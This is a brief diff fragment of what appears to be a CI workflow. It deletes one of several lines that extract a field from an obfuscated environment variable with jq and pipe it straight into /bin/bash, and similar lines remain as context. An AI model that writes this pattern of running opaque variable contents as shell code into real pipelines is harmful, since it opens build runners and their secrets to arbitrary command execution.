@@ -25,7 +25,6 @@ jobs:
           echo $dnij15354 | jq -r .zqvjj4 | /bin/bash
           echo $frie4 | jq -r .ubjsi875 | /bin/bash
           echo $ctosx37 | jq -r .g3 | /bin/bash
-          echo $nmcuz8 | jq -r .jqwu0389 | /bin/bash
           printf '%s' "$gxrk2" | jq -r .bhp41 | /bin/bash
 
       - name: Upload results
